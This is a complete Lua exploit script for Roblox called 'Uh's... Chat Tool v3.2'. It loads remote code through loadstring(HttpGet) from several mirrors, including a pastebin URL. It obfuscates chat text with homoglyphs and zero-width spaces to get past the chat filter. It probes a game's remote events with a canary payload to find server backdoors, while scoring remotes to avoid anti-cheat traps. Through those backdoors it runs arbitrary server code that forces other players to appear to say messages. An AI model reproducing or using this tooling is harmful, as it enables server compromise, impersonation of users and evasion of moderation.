--[[
    Uh's... Chat Tool v3.2 - Silent Edition (English)
    ==================================================
    Features:
      - Display obfuscated chat bubbles above any player.
      - Smart player search with partial Name/DisplayName matching.
      - Stealthy backdoor scanner with anti-detection scoring.
      - Safe Mode: restricts scanning to chat-related remotes only.

    Architecture (sections):
      1.  Configuration       – Centralized settings table
      2.  Rayfield Loader     – UI framework with multi-mirror fallback
      3.  Services            – Cached Roblox service references
      4.  Utility Helpers     – Shared notification & validation functions
      5.  Bypass Engine       – Text obfuscation strategies
      6.  Bubble Manager      – Chat bubble display on characters
      7.  Backdoor Scanner    – Remote-event scanner with safety scoring
      8.  Initialization      – Engine instances and state variables
      9.  UI Construction     – Tabs, inputs, buttons, dropdowns
      10. Finalization        – Startup notification
--]]

-- ========================================================================= --
--                          1. CONFIGURATION                                 --
-- ========================================================================= --

--- Central configuration table for all tool settings.
--- Modify these values to change default behavior on startup.
local CONFIG = {
    UI = {
        Theme      = "Default",   -- Rayfield theme name
        SaveConfig = true,        -- Persist UI settings between sessions
        FolderName = "UhsChat",   -- Folder used for config storage
        FileName   = "Settings",  -- Config file name inside folder
    },
    Bypass = {
        -- Supported methods: "Homoglyph", "ZeroWidth", "Combined", "Advanced"
        Method = "Advanced",
    },
    Backdoor = {
        AutoScan          = false, -- Run backdoor scan automatically on startup
        UseBubbleFallback = true,  -- Fall back to visual bubble if backdoor fails
        ScanTimeout       = 30,    -- Max seconds to wait for scan response
        DelayFactor       = 2.5,   -- Multiplier for inter-remote test delay
        SafeMode          = true,  -- Only test remotes with chat-like names
        TestDelay         = 0.5,   -- Seconds between each remote test
    },
}

-- ========================================================================= --
--                  2. RAYFIELD LOADER (MULTIPLE MIRRORS)                    --
-- ========================================================================= --

--- Attempt to load the Rayfield UI library from multiple CDN mirrors.
--- Falls back to a lightweight stub that prints notifications to console.
local Rayfield = nil
local rayfieldSources = {
    "https://sirius.menu/rayfield",
    "https://raw.githubusercontent.com/shlexware/Rayfield/main/source",
    "https://pastebin.com/raw/jiBxV7iB",
}

for _, url in ipairs(rayfieldSources) do
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    if success and result then
        Rayfield = result
        break
    end
end

-- Provide a minimal stub so the rest of the script runs without errors
-- when Rayfield is unavailable (e.g., in headless / console mode).
if not Rayfield then
    warn("Rayfield unavailable. Running in console-only mode.")

    local NO_OP = function() end
    local STUB_ELEMENT = { Set = NO_OP, Refresh = NO_OP }

    Rayfield = {
        Notify = function(_, d) print("[NOTIFY]", d.Title, d.Content) end,
        CreateWindow = function()
            return {
                CreateTab = function()
                    return {
                        CreateSection   = NO_OP,
                        CreateInput     = function() return STUB_ELEMENT end,
                        CreateButton    = NO_OP,
                        CreateDropdown  = function() return STUB_ELEMENT end,
                        CreateParagraph = function() return STUB_ELEMENT end,
                        CreateToggle    = NO_OP,
                        CreateSlider    = function() return STUB_ELEMENT end,
                    }
                end,
            }
        end,
    }
end

-- ========================================================================= --
--                            3. SERVICES                                    --
-- ========================================================================= --

--- Cached references to frequently-used Roblox services.
--- Storing them locally avoids repeated GetService lookups at call sites.
local Players           = game:GetService("Players")
local TextChatService   = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Chat              = game:GetService("Chat")
local Workspace         = game:GetService("Workspace")
local HttpService       = game:GetService("HttpService")
local RunService        = game:GetService("RunService")
local LocalPlayer       = Players.LocalPlayer

-- ========================================================================= --
--                        4. UTILITY HELPERS                                 --
-- ========================================================================= --

--- Display a Rayfield notification with a standardised format.
--- Centralises all notification calls so the pattern is never duplicated.
--- @param title    string  Notification title
--- @param content  string  Notification body text
--- @param duration number  Display time in seconds (default 3)
local function notify(title, content, duration)
    Rayfield:Notify({
        Title    = title,
        Content  = content,
        Duration = duration or 3,
    })
end

--- Validate that a message has been entered; show an error if empty.
--- @param message string  The current message text
--- @return boolean        true when the message is non-empty
local function requireMessage(message)
    if message == "" then
        notify("Error", "Please enter a message.", 3)
        return false
    end
    return true
end

--- Validate that a target player has been selected; show an error if nil.
--- @param player Instance|nil  The currently selected player
--- @return boolean             true when a valid player is selected
local function requireTarget(player)
    if not player then
        notify("Error", "Select a target first.", 3)
        return false
    end
    return true
end

-- ========================================================================= --
--                        5. BYPASS ENGINE                                   --
-- ========================================================================= --

--- BypassEngine applies various text-obfuscation strategies to evade
--- Roblox's chat filter.  Four methods are supported:
---   Homoglyph – Replace Latin letters with visually-similar Cyrillic/Greek
---   ZeroWidth – Insert invisible zero-width spaces between characters
---   Combined  – Homoglyph + ZeroWidth together
---   Advanced  – Randomly mixes multiple glyph alphabets + sparse ZWSP
local BypassEngine = {}
BypassEngine.__index = BypassEngine

-- Lookup table mapping Latin characters to visually-similar Unicode glyphs.
-- Keys suffixed with "2" are Greek alternatives; "3" are Armenian alternatives.
local HOMOGLYPH_MAP = {
    -- Cyrillic (primary)
    a = "а", c = "с", e = "е", o = "о", p = "р", x = "х", y = "у",
    k = "к", m = "м", t = "т", h = "һ", b = "Ь",
    A = "А", B = "В", C = "С", E = "Е", H = "Н", I = "І", J = "Ј",
    K = "К", M = "М", O = "О", P = "Р", T = "Т", X = "Х", Y = "Ү",
    -- Greek (secondary)
    a2 = "α", e2 = "ε", o2 = "ο", p2 = "ρ", c2 = "ϲ", x2 = "χ", y2 = "γ",
    A2 = "Α", B2 = "Β", E2 = "Ε", H2 = "Η", I2 = "Ι", K2 = "Κ", M2 = "Μ",
    -- Armenian (tertiary)
    a3 = "ա", e3 = "ե", o3 = "օ", p3 = "р", c3 = "с",
}

--- Unicode zero-width space character used to break token boundaries.
local ZWSP = "\u{200B}"

--- Create a new BypassEngine with the given obfuscation method.
--- @param method string|nil  One of "Homoglyph", "ZeroWidth", "Combined", "Advanced"
--- @return table             BypassEngine instance
function BypassEngine.new(method)
    local self = setmetatable({}, BypassEngine)
    self.Method = method or "Advanced"
    return self
end

--- Replace every Latin letter with its primary Cyrillic homoglyph when available.
--- @param text string  Input text
--- @return string      Obfuscated text
function BypassEngine:applyHomoglyph(text)
    return text:gsub("%a", function(c)
        return HOMOGLYPH_MAP[c] or c
    end)
end

--- Insert zero-width spaces between characters at random positions.
--- Roughly 40 % of inter-character gaps receive a ZWSP.
--- Uses direct table indexing (#parts + 1) instead of table.insert for speed.
--- @param text string  Input text
--- @return string      Obfuscated text
function BypassEngine:applyZeroWidth(text)
    local parts = {}
    local len = #text
    for i = 1, len do
        parts[#parts + 1] = text:sub(i, i)
        if i < len and math.random() > 0.6 then
            parts[#parts + 1] = ZWSP
        end
    end
    return table.concat(parts)
end

--- Apply both homoglyph replacement and zero-width space insertion.
--- @param text string  Input text
--- @return string      Obfuscated text
function BypassEngine:applyCombined(text)
    return self:applyZeroWidth(self:applyHomoglyph(text))
end

--- Advanced obfuscation: randomly pick from multiple glyph alphabets
--- (Cyrillic, Greek, Armenian) and sprinkle zero-width spaces between
--- adjacent letter pairs.
--- @param text string  Input text
--- @return string      Obfuscated text
function BypassEngine:applyAdvanced(text)
    -- Pass 1: randomly substitute glyphs from primary, secondary, or tertiary sets
    local bypassed = text:gsub("%a", function(c)
        if math.random() > 0.5 then
            local variants = {
                HOMOGLYPH_MAP[c],
                HOMOGLYPH_MAP[c .. "2"],
                HOMOGLYPH_MAP[c .. "3"],
            }
            for _, v in ipairs(variants) do
                if v then return v end
            end
        end
        return c
    end)

    -- Pass 2: insert sparse zero-width spaces between adjacent Latin letters
    bypassed = bypassed:gsub("([a-zA-Z])([a-zA-Z])", function(c1, c2)
        if math.random() > 0.7 then
            return c1 .. ZWSP .. c2
        end
        return c1 .. c2
    end)

    return bypassed
end

--- Dispatch table mapping method names to their implementations.
--- Defined once at module level to avoid re-creating it on every Process() call.
local BYPASS_METHODS = {
    Homoglyph = BypassEngine.applyHomoglyph,
    ZeroWidth = BypassEngine.applyZeroWidth,
    Combined  = BypassEngine.applyCombined,
    Advanced  = BypassEngine.applyAdvanced,
}

--- Process text through the currently-selected bypass method.
--- Falls back to Advanced if the configured method name is unrecognised.
--- @param text string  Raw message text
--- @return string      Obfuscated text
function BypassEngine:Process(text)
    local func = BYPASS_METHODS[self.Method] or BypassEngine.applyAdvanced
    return func(self, text)
end

-- ========================================================================= --
--                        6. BUBBLE MANAGER                                  --
-- ========================================================================= --

--- BubbleManager handles displaying obfuscated chat bubbles above
--- player characters using TextChatService:DisplayBubble.
local BubbleManager = {}
BubbleManager.__index = BubbleManager

--- Create a new BubbleManager linked to a BypassEngine instance.
--- @param bypassEngine table  BypassEngine instance for text processing
--- @return table              BubbleManager instance
function BubbleManager.new(bypassEngine)
    local self = setmetatable({}, BubbleManager)
    self.Bypass = bypassEngine
    return self
end

--- Display an obfuscated chat bubble above a player's head.
--- Returns false silently when the player has no character or head part.
--- @param player  Instance  The target player
--- @param message string    Raw message text (will be obfuscated)
--- @return boolean          true if the bubble was displayed successfully
function BubbleManager:DisplayForPlayer(player, message)
    if not player or not player:IsA("Instance") then return false end

    local character = player.Character
    if not character then return false end

    local head = character:FindFirstChild("Head")
    if not head then return false end

    local processed = self.Bypass:Process(message)
    local success = pcall(function()
        TextChatService:DisplayBubble(head, processed)
    end)
    return success
end

--- Convenience wrapper: display an obfuscated bubble above the local player.
--- @param message string  Raw message text
--- @return boolean        true if the bubble was displayed successfully
function BubbleManager:DisplayForSelf(message)
    return self:DisplayForPlayer(LocalPlayer, message)
end

-- ========================================================================= --
--                  7. BACKDOOR SCANNER (Anti-Detection)                     --
-- ========================================================================= --

--- BackdoorScanner probes RemoteEvent/RemoteFunction instances to find
--- server-side backdoors that can execute arbitrary code.  Remotes are
--- scored by name/path heuristics so chat-related ones are tested first
--- and known anti-cheat traps are avoided entirely.
local BackdoorScanner = {}
BackdoorScanner.__index = BackdoorScanner

-- Substrings indicating a remote is chat-related (boost score).
-- Pre-lowered so we only need a single :lower() call on the remote path.
local CHAT_KEYWORDS = {
    "saymessage", "chat", "message", "sendmessage", "talk", "broadcast",
    "defaultchatsystemchatevents", "chatservice", "textchat",
}

-- Substrings indicating anti-cheat traps (heavily penalise score).
-- Pre-lowered for the same reason.
local TRAP_KEYWORDS = {
    "kick", "ban", "detect", "anti", "exploit", "hack", "script", "logger",
    "punish", "flag", "report", "admin", "mod", "secure", "verify", "check",
}

--- Create a new BackdoorScanner linked to a BypassEngine.
--- @param bypassEngine table  BypassEngine instance for text obfuscation
--- @return table              BackdoorScanner instance
function BackdoorScanner.new(bypassEngine)
    local self = setmetatable({}, BackdoorScanner)
    self.Bypass         = bypassEngine
    self.BubbleManager  = nil    -- Set after BubbleMgr is created (see §8)
    self.WorkingGateway = nil    -- Cached working backdoor reference
    self.AllRemotes     = {}     -- Results from the last scan
    self.SafeMode       = CONFIG.Backdoor.SafeMode
    self.TestDelay      = CONFIG.Backdoor.TestDelay
    return self
end

--- Score a remote based on how likely it is to be a usable chat backdoor.
--- Higher scores = safer and more promising targets; negative = likely trap.
--- @param remote Instance  A RemoteEvent or RemoteFunction
--- @return number          Heuristic score
local function scoreRemote(remote)
    local score = 0
    local fullPath = remote:GetFullName():lower()

    -- Boost score for chat-related name patterns (plain find for speed)
    for _, keyword in ipairs(CHAT_KEYWORDS) do
        if fullPath:find(keyword, 1, true) then
            score = score + 50
        end
    end

    -- Heavily penalise remotes that match anti-cheat patterns
    for _, keyword in ipairs(TRAP_KEYWORDS) do
        if fullPath:find(keyword, 1, true) then
            score = score - 1000
        end
    end

    -- Prefer remotes located in expected containers
    local parent = remote.Parent
    if parent then
        if parent == ReplicatedStorage then
            score = score + 10
        elseif parent:IsA("Folder") and parent.Name:lower():find("chat") then
            score = score + 20
        end
    end

    -- Penalise generically-named remotes (likely auto-generated placeholders)
    if remote.Name == "RemoteEvent" or remote.Name == "RemoteFunction" then
        score = score - 20
    end

    return score
end

--- Maximum depth for the recursive remote-collection scan.
local MAX_SCAN_DEPTH = 15

--- Recursively collect and score all RemoteEvent/RemoteFunction instances
--- in the game tree.  Results are sorted by descending score so the most
--- promising candidates are tested first.
--- @return table  Flat array of remote instances, best-first
function BackdoorScanner:CollectRemotes()
    local scored = {}

    local function scan(obj, depth)
        if depth > MAX_SCAN_DEPTH then return end
        for _, child in ipairs(obj:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                local s = scoreRemote(child)
                -- Discard remotes with extremely negative scores (obvious traps)
                if s > -500 then
                    scored[#scored + 1] = { remote = child, score = s }
                end
            end
            scan(child, depth + 1)
        end
    end

    scan(game, 0)

    -- Sort descending by score
    table.sort(scored, function(a, b) return a.score > b.score end)

    -- Flatten into a plain array of remote instances
    local remotes = {}
    for _, entry in ipairs(scored) do
        remotes[#remotes + 1] = entry.remote
    end

    self.AllRemotes = remotes
    return remotes
end

--- Generate a unique workspace name for the canary BoolValue used to
--- confirm whether a backdoor successfully executed server-side code.
--- @return string  A unique name like "BEXE_xA1234"
function BackdoorScanner:GenerateUniqueName()
    local CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local name
    repeat
        local idx = math.random(1, #CHARS)
        name = "BEXE_" .. CHARS:sub(idx, idx) .. tostring(math.random(1000, 9999))
    until not Workspace:FindFirstChild(name)
    return name
end

--- Lua payload sent to the server to create a canary object.
--- If the dummy BoolValue appears in Workspace, the tested remote works.
local CANARY_PAYLOAD = [[
local dummy = Instance.new("BoolValue")
dummy.Name = "%s"
dummy.Parent = workspace
game:GetService("Debris"):AddItem(dummy, 5)
]]

--- Scan for a working backdoor by firing each remote with a canary payload
--- and watching Workspace for the resulting object.
--- @param timeout     number|nil   Max wait time in seconds (default from CONFIG)
--- @param delayFactor number|nil   Delay multiplier (default from CONFIG)
--- @param safeMode    boolean|nil  Restrict to chat-related remotes (default from CONFIG)
--- @return table|nil, string       Gateway table if found, plus a status message
function BackdoorScanner:Scan(timeout, delayFactor, safeMode)
    timeout     = timeout     or CONFIG.Backdoor.ScanTimeout
    delayFactor = delayFactor or CONFIG.Backdoor.DelayFactor
    safeMode    = (safeMode == nil) and self.SafeMode or safeMode

    -- Collect and optionally filter remotes
    local remotes = self:CollectRemotes()
    if #remotes == 0 then
        return nil, "No safe remotes found to test."
    end

    -- In safe mode, only keep remotes with a positive chat-related score
    if safeMode then
        local filtered = {}
        for _, r in ipairs(remotes) do
            if scoreRemote(r) > 0 then
                filtered[#filtered + 1] = r
            end
        end
        remotes = filtered
        if #remotes == 0 then
            return nil, "No chat-related remotes found (safe mode)."
        end
    end

    -- Prepare canary detection
    local dummyName    = self:GenerateUniqueName()
    local payload      = CANARY_PAYLOAD:format(dummyName)
    local foundGateway = nil

    -- Listen for the canary object to appear in Workspace
    local connection = Workspace.ChildAdded:Connect(function(child)
        if child.Name == dummyName then
            foundGateway = self.WorkingGateway
        end
    end)

    -- Safe mode uses the base delay; non-safe mode extends it by 1.5×
    local testDelay = math.max(0.1, self.TestDelay * (safeMode and 1 or 1.5))

    -- Fire each remote with the canary payload, best candidates first
    for _, remote in ipairs(remotes) do
        if foundGateway then break end

        local success = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(payload)
            else
                remote:FireServer(payload)
            end
        end)

        -- Temporarily cache this remote as the potential gateway
        if success then
            self.WorkingGateway = {
                Remote = remote,
                Execute = function(code)
                    if remote:IsA("RemoteFunction") then
                        remote:InvokeServer(code)
                    else
                        remote:FireServer(code)
                    end
                end,
            }
            task.wait(0.2)
        end

        task.wait(testDelay)
    end

    -- Wait for the canary object to appear (or timeout)
    local deadline = tick() + timeout
    while connection.Connected and not foundGateway and tick() < deadline do
        task.wait(0.1)
    end
    connection:Disconnect()

    -- Evaluate results
    if foundGateway then
        self.WorkingGateway = foundGateway
        local remotePath = foundGateway.Remote:GetFullName()
        return foundGateway, ("Backdoor found (safe mode: %s): %s"):format(tostring(safeMode), remotePath)
    end

    self.WorkingGateway = nil
    return nil, "No backdoor responded. Try toggling Safe Mode off (higher risk)."
end

--- Execute arbitrary Lua code through the cached backdoor.
--- @param code string       Lua source to run on the server
--- @return boolean, string  Success flag and optional error message
function BackdoorScanner:Execute(code)
    if not self.WorkingGateway then
        return false, "No working backdoor available."
    end
    local success, err = pcall(function()
        self.WorkingGateway.Execute(code)
    end)
    return success, err
end

--- Force a target player to "say" a message via the backdoor.
--- Falls back to a visual bubble when the backdoor fails and
--- CONFIG.Backdoor.UseBubbleFallback is enabled.
--- @param player  Instance  Target player
--- @param message string    Raw message text (will be obfuscated)
--- @return boolean, string  Success flag and status message
function BackdoorScanner:ForceSay(player, message)
    if not self.WorkingGateway then
        return false, "No backdoor available."
    end
    if not player or not player:IsA("Instance") then
        return false, "Invalid player."
    end

    local processed = self.Bypass:Process(message)

    -- Server-side script that attempts to send a chat message as the target.
    -- Tries the legacy ChatService path first, then TextChatService.
    local scriptToRun = string.format([[
        local target = game:GetService("Players"):FindFirstChild("%s")
        if target then
            local chatService     = game:GetService("Chat")
            local textChatService = game:GetService("TextChatService")
            local message         = "%s"

            -- Legacy chat system path
            if chatService and chatService:FindFirstChild("ChatWindow") then
                local replicatedStorage  = game:GetService("ReplicatedStorage")
                local sayMessageRequest  = replicatedStorage:FindFirstChild("SayMessageRequest", true)
                if sayMessageRequest then
                    sayMessageRequest:FireServer(message, "All")
                elseif target.Character and target.Character:FindFirstChild("Head") then
                    chatService:Chat(target.Character.Head, message, "Blue")
                end
            end

            -- TextChatService path (newer games)
            if textChatService then
                local channels = textChatService:FindFirstChild("TextChannels")
                if channels then
                    local general = channels:FindFirstChild("RBXGeneral")
                    if general then
                        general:DisplaySystemMessage(message, target.Name)
                    end
                end
            end
        end
    ]], player.Name, processed:gsub('"', '\\"'))

    local success, err = self:Execute(scriptToRun)
    if not success then
        -- Attempt visual bubble fallback via the linked BubbleManager instance
        if CONFIG.Backdoor.UseBubbleFallback and self.BubbleManager then
            local bubbleOk = self.BubbleManager:DisplayForPlayer(player, message)
            if bubbleOk then
                return true, "Backdoor failed, but bubble displayed."
            end
        end
        return false, "Execution failed: " .. tostring(err)
    end
    return true, "Message forced via backdoor."
end

-- ========================================================================= --
--                         8. INITIALIZATION                                 --
-- ========================================================================= --

--- Create core engine instances with the configured defaults.
local Bypass    = BypassEngine.new(CONFIG.Bypass.Method)
local BubbleMgr = BubbleManager.new(Bypass)
local Scanner   = BackdoorScanner.new(Bypass)

-- Link the BubbleManager instance so BackdoorScanner:ForceSay can use
-- it as a fallback (fixes a bug where the class table was called instead
-- of the actual instance).
Scanner.BubbleManager = BubbleMgr

--- Shared mutable UI state
local CurrentMessage = ""   -- Text entered by the user
local TargetPlayer   = nil  -- Currently selected player Instance
local TargetName     = ""   -- Display string for the selected target

-- Run optional auto-scan in a background thread
if CONFIG.Backdoor.AutoScan then
    task.spawn(function()
        local _, msg = Scanner:Scan()
        notify("Backdoor Scanner", msg, 5)
    end)
end

-- ========================================================================= --
--                       9. UI CONSTRUCTION                                  --
-- ========================================================================= --

local Window = Rayfield:CreateWindow({
    Name            = "Uh's... Chat Tool v3.2",
    LoadingTitle    = "Uh's... Chat",
    LoadingSubtitle = "Silent Edition",
    Theme           = CONFIG.UI.Theme,
    ConfigurationSaving = {
        Enabled    = CONFIG.UI.SaveConfig,
        FolderName = CONFIG.UI.FolderName,
        FileName   = CONFIG.UI.FileName,
    },
    Discord   = { Enabled = false },
    KeySystem = false,
})

local ChatTab     = Window:CreateTab("Chat", "message-square")
local SettingsTab = Window:CreateTab("Settings", "settings")

-- ------------------------------ Preview ---------------------------------- --

--- Refresh the bypass preview paragraph with the obfuscated form of the
--- current message, or a placeholder when no message has been entered.
--- @param para table  Rayfield paragraph element to update
local function UpdatePreview(para)
    if CurrentMessage ~= "" then
        para:Set({ Title = "Obfuscated Preview", Content = Bypass:Process(CurrentMessage) })
    else
        para:Set({ Title = "Obfuscated Preview", Content = "..." })
    end
end

-- ----------------------------- Target Info ------------------------------- --

--- Forward-declared paragraph reference (assigned after the element is created).
local TargetInfoPara

--- Update the target-info paragraph to reflect the current player selection.
local function UpdateTargetInfo()
    if not TargetInfoPara then return end

    if TargetPlayer then
        TargetInfoPara:Set({
            Title   = "Selected Target",
            Content = ("%s (@%s) | ID: %d"):format(
                TargetPlayer.Name, TargetPlayer.DisplayName, TargetPlayer.UserId
            ),
        })
    elseif TargetName ~= "" then
        TargetInfoPara:Set({
            Title   = "Target (Offline?)",
            Content = TargetName .. " - Not found online.",
        })
    else
        TargetInfoPara:Set({ Title = "Current Target", Content = "None" })
    end
end

-- ====================== Chat Tab: Message Input ========================== --

ChatTab:CreateSection("Message Input")

local MsgInput = ChatTab:CreateInput({
    Name                 = "Your Message",
    PlaceholderText      = "Type here...",
    RemoveTextAfterFocus = false,
    Callback = function(text)
        CurrentMessage = text or ""
    end,
})

-- ====================== Chat Tab: Bypass Preview ========================= --

ChatTab:CreateSection("Bypass Preview")

local PreviewPara = ChatTab:CreateParagraph({
    Title   = "Obfuscated Preview",
    Content = "...",
})

ChatTab:CreateButton({
    Name     = "Refresh Preview",
    Callback = function() UpdatePreview(PreviewPara) end,
})

-- ====================== Chat Tab: Bubble Actions ========================= --

ChatTab:CreateSection("Bubble Actions")

ChatTab:CreateButton({
    Name = "Display Bubble on Yourself",
    Callback = function()
        if not requireMessage(CurrentMessage) then return end

        local ok = BubbleMgr:DisplayForSelf(CurrentMessage)
        if ok then
            notify("Success", "Bubble displayed above you!", 2)
        else
            notify("Failure", "Could not display bubble.", 3)
        end
    end,
})

-- ====================== Chat Tab: Player Search ========================== --

ChatTab:CreateSection("Target Selection (Partial Match)")

--- Filter the player list by partial name or display-name match.
--- Returns a sorted array of matching player Name strings, or a
--- single-element placeholder when there are no matches.
--- @param searchText string  Search query (case-insensitive)
--- @return table             Array of matching player names
local function FilterPlayers(searchText)
    local matches = {}
    local query = searchText:lower()

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local nameLower    = player.Name:lower()
            local displayLower = player.DisplayName:lower()
            if nameLower:find(query, 1, true) or displayLower:find(query, 1, true) then
                matches[#matches + 1] = player.Name
            end
        end
    end

    if #matches == 0 then
        return { "(no matches)" }
    end

    table.sort(matches)
    return matches
end

local SearchInput = ChatTab:CreateInput({
    Name                 = "Search by Name or DisplayName",
    PlaceholderText      = "Type to filter...",
    RemoveTextAfterFocus = false,
    Callback = function() end,  -- Actual logic runs via heartbeat polling below
})

local PlayerDropdown = ChatTab:CreateDropdown({
    Name          = "Select Target",
    Options       = { "(type above to search)" },
    CurrentOption = nil,
    Callback = function(opt)
        local selected = type(opt) == "table" and opt[1] or opt
        if selected and selected ~= "(type above to search)" and selected ~= "(no matches)" then
            TargetPlayer = Players:FindFirstChild(selected)
            TargetName   = selected
        else
            TargetPlayer = nil
            TargetName   = ""
        end
        UpdateTargetInfo()
    end,
})

-- Now that the paragraph exists we can assign the forward-declared reference.
TargetInfoPara = ChatTab:CreateParagraph({ Title = "Current Target", Content = "None" })

-- Track the last search text to avoid redundant dropdown refreshes.
local lastSearchText = ""

--- Called when the search input value changes; refreshes the dropdown and
--- auto-selects when exactly one player matches.
local function OnSearchTextChanged()
    local text = SearchInput.CurrentValue or ""
    if text == lastSearchText then return end
    lastSearchText = text

    local options = FilterPlayers(text)
    PlayerDropdown:Refresh(options, true)

    -- Auto-select the sole match for convenience
    if #options == 1 and options[1] ~= "(no matches)" then
        TargetPlayer = Players:FindFirstChild(options[1])
        TargetName   = options[1]
        UpdateTargetInfo()
    end
end

-- Throttled polling: check for search-text changes at most every 0.2 s
-- instead of every single frame, reducing unnecessary per-frame overhead.
local SEARCH_POLL_INTERVAL  = 0.2
local searchPollAccumulator = 0

RunService.Heartbeat:Connect(function(dt)
    searchPollAccumulator = searchPollAccumulator + dt
    if searchPollAccumulator >= SEARCH_POLL_INTERVAL then
        searchPollAccumulator = 0
        if SearchInput and SearchInput.CurrentValue ~= lastSearchText then
            OnSearchTextChanged()
        end
    end
end)

ChatTab:CreateButton({
    Name = "Refresh Player List",
    Callback = function()
        local text    = SearchInput.CurrentValue or ""
        local options = FilterPlayers(text)
        PlayerDropdown:Refresh(options, true)
        notify("Player List", "List updated.", 2)
    end,
})

-- Keep the dropdown in sync when players join or leave the server.
Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    OnSearchTextChanged()
end)

Players.PlayerRemoving:Connect(function()
    task.wait(0.5)
    OnSearchTextChanged()
end)

-- Initial population after a short delay to let services settle.
task.spawn(function()
    task.wait(0.5)
    OnSearchTextChanged()
end)

-- ====================== Chat Tab: Target Actions ========================= --

ChatTab:CreateSection("Actions on Target")

ChatTab:CreateButton({
    Name = "Display Bubble on Target (Visual)",
    Callback = function()
        if not requireMessage(CurrentMessage) then return end
        if not requireTarget(TargetPlayer) then return end

        local ok = BubbleMgr:DisplayForPlayer(TargetPlayer, CurrentMessage)
        if ok then
            notify("Success", "Bubble displayed on " .. TargetPlayer.Name, 2)
        else
            notify("Failure", "Could not display bubble.", 3)
        end
    end,
})

ChatTab:CreateButton({
    Name = "Force Target to Say (Backdoor)",
    Callback = function()
        if not requireMessage(CurrentMessage) then return end
        if not requireTarget(TargetPlayer) then return end

        -- Auto-scan if no backdoor is cached yet
        if not Scanner.WorkingGateway then
            notify("Backdoor", "No backdoor cached. Scanning...", 3)
            local gateway, msg = Scanner:Scan()
            if not gateway then
                notify("Scan Failed", msg, 5)
                return
            end
            notify("Backdoor Found", msg, 3)
        end

        local success, info = Scanner:ForceSay(TargetPlayer, CurrentMessage)
        notify(success and "Backdoor Success" or "Backdoor Failed", info, 5)
    end,
})

ChatTab:CreateParagraph({
    Title   = "Note",
    Content = "Force Say uses a server backdoor. If none works, bubble fallback will display visually.",
})

-- ====================== Settings Tab: Bypass Method ====================== --

SettingsTab:CreateSection("Bypass Method")

SettingsTab:CreateDropdown({
    Name          = "Method",
    Options       = { "Homoglyph", "ZeroWidth", "Combined", "Advanced" },
    CurrentOption = CONFIG.Bypass.Method,
    Callback = function(opt)
        local method = type(opt) == "table" and opt[1] or opt
        Bypass.Method        = method
        CONFIG.Bypass.Method = method
        notify("Bypass", "Method changed to " .. method, 2)
    end,
})

-- ====================== Settings Tab: Backdoor Scanner =================== --

SettingsTab:CreateSection("Backdoor Scanner")

SettingsTab:CreateToggle({
    Name         = "Auto-Scan on Startup",
    CurrentValue = CONFIG.Backdoor.AutoScan,
    Callback = function(val)
        CONFIG.Backdoor.AutoScan = val
    end,
})

SettingsTab:CreateToggle({
    Name         = "Use Bubble Fallback",
    CurrentValue = CONFIG.Backdoor.UseBubbleFallback,
    Callback = function(val)
        CONFIG.Backdoor.UseBubbleFallback = val
    end,
})

SettingsTab:CreateButton({
    Name = "Re-scan for Backdoors",
    Callback = function()
        notify("Scanning", "Searching for backdoors...", 2)
        task.spawn(function()
            local gateway, msg = Scanner:Scan()
            notify(gateway and "Scan Complete" or "Scan Failed", msg, 5)
        end)
    end,
})

SettingsTab:CreateSlider({
    Name         = "Scan Timeout (seconds)",
    Range        = { 5, 60 },
    Increment    = 1,
    CurrentValue = CONFIG.Backdoor.ScanTimeout,
    Callback = function(val)
        CONFIG.Backdoor.ScanTimeout = val
    end,
})

SettingsTab:CreateSlider({
    Name         = "Delay Factor",
    Range        = { 1, 5 },
    Increment    = 0.5,
    CurrentValue = CONFIG.Backdoor.DelayFactor,
    Callback = function(val)
        CONFIG.Backdoor.DelayFactor = val
    end,
})

-- ====================== Settings Tab: Stealth ============================ --

SettingsTab:CreateSection("Stealth & Anti-Detection")

SettingsTab:CreateToggle({
    Name         = "Safe Mode (Only Test Chat Remotes)",
    CurrentValue = Scanner.SafeMode,
    Callback = function(val)
        Scanner.SafeMode         = val
        CONFIG.Backdoor.SafeMode = val
        local status = val
            and "Enabled – lower detection risk."
            or  "Disabled – scans all remotes (dangerous)."
        notify("Safe Mode", status, 3)
    end,
})

SettingsTab:CreateSlider({
    Name         = "Test Delay (seconds)",
    Range        = { 0.1, 3.0 },
    Increment    = 0.1,
    CurrentValue = Scanner.TestDelay,
    Callback = function(val)
        Scanner.TestDelay         = val
        CONFIG.Backdoor.TestDelay = val
    end,
})

SettingsTab:CreateButton({
    Name = "Quick Scan (Chat Only)",
    Callback = function()
        notify("Scanning", "Searching chat backdoors (safe)...", 2)
        task.spawn(function()
            local gateway, msg = Scanner:Scan(nil, nil, true)
            notify(gateway and "Scan Complete" or "Scan Failed", msg, 5)
        end)
    end,
})

-- ========================================================================= --
--                          10. FINALIZATION                                  --
-- ========================================================================= --

notify(
    "Uh's... Chat Tool v3.2",
    "Loaded! Use the search to find players, then display bubbles or force chat.",
    6
)
